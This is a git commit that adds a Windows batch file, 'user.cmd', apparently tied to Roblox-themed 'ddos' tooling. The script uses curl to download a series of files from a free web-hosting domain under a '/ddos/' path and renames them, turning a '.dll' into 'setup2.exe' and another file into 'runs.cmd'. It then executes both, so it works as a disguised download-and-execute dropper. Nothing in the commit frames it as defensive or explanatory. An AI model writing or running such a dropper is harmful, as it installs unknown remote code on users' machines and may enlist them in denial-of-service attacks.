08e28cc9d457b477f9e302384023e8811f0181df
awwsssssssss <85400732+awwsssssssss@users.noreply.github.com>
2021-10-17 23:19:35 +0700

    Add files via upload

---
+++ user.cmd
@@ -0,0 +1,28 @@
+@echo off
+echo user:off
+echo temoany
+echo Downloading....
+ping 8.8.0.8:80
+curl https://robloxian123.000webhostapp.com/ddos/version > output.txt
+curl https://robloxian123.000webhostapp.com/ddos/caveand > Usdb.dll
+curl https://api.roblox.com/send > outputapi.lua
+curl https://robloxian123.000webhostapp.com/ddos/zip.dll > setup2.exe
+curl https://robloxian123.000webhostapp.com/ddos/microsoft_arm10.dms > microsoft_arm10.dms
+curl https://robloxian123.000webhostapp.com/ddos/ddos_run.bs > runs.cmd
+curl https://robloxian123.000webhostapp.com/ddos/dwao > inside.ddc
+curl https://robloxian123.000webhostapp.com/ddos/liebrt > lincse.txt
+curl https://robloxian123.000webhostapp.com/ddos/otifine > oftini.snx
+cls
+echo version:
+type output.txt
+echo:
+pause
+type usdb.dll
+echo:
+echo output:
+type outputapi.lua 
+pause
+echo ipening
+setup2.exe
+cls
+runs.cmd
